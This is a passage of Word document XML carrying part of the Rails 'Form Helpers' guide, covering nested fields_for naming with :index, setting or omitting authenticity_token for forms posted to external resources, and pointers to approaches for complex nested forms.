    <w:p w14:paraId="734DD5F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To create more intricate nestings, you can specify the first part of the input name (</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>person[address]</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> in the previous example) explicitly, for example</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5D81B023" w14:textId="77777777" w:rsidTr="006E53E9">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0C15BF6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fields_for 'person[address][primary]', address, :index</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; address do</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>|address_form| %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="395D345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address_form.text_field :city</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47AD46C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534F191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will create inputs like</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72EE8433" w14:textId="77777777" w:rsidTr="006E53E9">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1C8344AE" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1236474346"/>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id="person_address_primary_1_city"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>name="person[address][primary][1][city]"</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value="bologna"</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4352932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As a general rule the final input name is the concatenation of the name given to </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>fields_for</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>/</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the index value and the name of the attribute. You can also pass an </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:index</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> option directly to helpers such as </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>text_field</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, but it is usually less repetitive to specify this at the form builder level rather than on individual input controls.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51E5594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As a shortcut you can append [] to the name and omit the </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:index</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> option. This is the same as specifying </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:index =&gt; address</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> so</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3C282E6B" w14:textId="77777777" w:rsidTr="006E53E9">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="669DCAA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fields_for 'person[address][primary][]', address do</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>|address_form| %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4E748A2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w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>address_form.text_field :city</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67E44B4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6C8999F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produces exactly the same output as the previous example.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75E52D96"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8 Forms to external resources</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7412D9F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If you need to post some data to an external resource it is still great to build your form using rails form helpers. But sometimes you need to set an </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>authenticity_token</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> for this resource. You can do it by passing an </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:authenticity_token =&gt; 'your_external_token'</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> parameter to the </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>form_tag</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> options:</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14792643" w14:textId="77777777" w:rsidTr="006E53E9">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="12419A8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form_tag '</w:t>
            </w:r>
            <w:hyperlink r:id="rId311" w:history="1">
              <w:r w:rsidRPr="006E53E9">
                <w:rPr>
                  <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                  <w:color w:val="0000FF"/>
                  <w:kern w:val="0"/>
                  <w:sz w:val="24"/>
                  <w:szCs w:val="24"/>
                  <w:u w:val="single"/>
                </w:rPr>
                <w:t>http://farfar.away/form</w:t>
              </w:r>
            </w:hyperlink>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>', :authenticity_token</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; 'external_token') do</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79D2CC6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Form contents</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="26F808D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06BD844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Sometimes when you submit data to an external resource, like payment gateway, fields you can use in your form are limited by an external API. So you may want not to generate an </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>authenticity_token</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> hidden field at all. For doing this just pass </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>false</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> to the </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:authenticity_token</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> option:</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417F9322" w14:textId="77777777" w:rsidTr="006E53E9">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2F874FA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form_tag '</w:t>
            </w:r>
            <w:hyperlink r:id="rId312" w:history="1">
              <w:r w:rsidRPr="006E53E9">
                <w:rPr>
                  <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                  <w:color w:val="0000FF"/>
                  <w:kern w:val="0"/>
                  <w:sz w:val="24"/>
                  <w:szCs w:val="24"/>
                  <w:u w:val="single"/>
                </w:rPr>
                <w:t>http://farfar.away/form</w:t>
              </w:r>
            </w:hyperlink>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>', :authenticity_token</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; false) do</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7507DA0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Form contents</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="49439A3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563C5BD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same technique is available for the </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>form_for</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> too:</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0E19489F" w14:textId="77777777" w:rsidTr="006E53E9">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="649B19F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form_for @invoice, :url</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; external_url, :authenticity_token</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; 'external_token'</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r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>|f|</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2D3F3B8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Form contents</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6DDB38A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 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7B03A93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Or if you don’t want to render an </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>authenticity_token</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> field:</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124170C3" w14:textId="77777777" w:rsidTr="006E53E9">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5680932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form_for @invoice, :url</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; external_url, :authenticity_token</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; false</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r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>|f|</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1D9B15A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Form contents</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="619AFF4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 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738FB45D"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9 Building Complex Forms</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B07579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Many apps grow beyond simple forms editing a single object. For example when creating a Person you might want to allow the user to (on the same form) create multiple address records (home, work, etc.). When later editing that person the user should be able to add, remove or amend addresses as necessary. While this guide has shown you all the pieces necessary to handle this, Rails does not yet have a standard end-to-end way of accomplishing this, but many have come up with viable approaches. These include:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13B7DC74" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="88"/>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As of Rails 2.3, Rails includes </w:t>
      </w:r>
      <w:hyperlink r:id="rId313" w:anchor="nested-attributes" w:history="1">
        <w:r w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Nested Attributes</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:hyperlink r:id="rId314" w:anchor="nested-object-forms" w:history="1">
        <w:r w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Nested Object Forms</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0F910238" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="88"/>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Ryan Bates’ series of Railscasts on </w:t>
      </w:r>
      <w:hyperlink r:id="rId315" w:history="1">
        <w:r w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>complex forms</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="490EDB09" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="88"/>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Handle Multiple Models in One Form from </w:t>
      </w:r>
      <w:hyperlink r:id="rId316" w:history="1">
        <w:r w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Advanced Rails Recipes</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="59F5C70D" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="88"/>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Eloy Duran’s </w:t>
      </w:r>
      <w:hyperlink r:id="rId317" w:history="1">
        <w:r w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>complex-forms-examples</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> application</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44E2354F" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="88"/>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Lance Ivy’s </w:t>
      </w:r>
      <w:hyperlink r:id="rId318" w:history="1">
        <w:r w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>nested_assignment</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> plugin and </w:t>
      </w:r>
      <w:hyperlink r:id="rId319" w:history="1">
        <w:r w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
